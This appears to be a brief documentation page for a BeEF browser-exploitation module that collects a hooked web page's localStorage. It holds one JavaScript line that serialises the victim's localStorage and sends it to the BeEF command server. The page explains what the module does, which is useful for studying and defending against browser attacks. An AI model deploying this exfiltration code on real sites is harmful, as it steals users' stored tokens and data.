## Summary
* **Objective**: Extracts data from the HTML5 localStorage object..
* **Date**: ???
* **Authors**: bcoles
* **Browsers**: Internet Explorer 8+, Firefox 4+, opera 11+, Chrome 4+, Safari 4+
* [[Code|https://github.com/beefproject/beef/tree/master/modules/browser/hooked_domain/get_local_storage]]

## Internal Working

This module just gather the localStorage of the page by using window['localStorage'] :

```javascript
	beef.net.send("<%= @command_url %>", <%= @command_id %>, "localStorage="+JSON.stringify(window['localStorage']));
```

## Feedback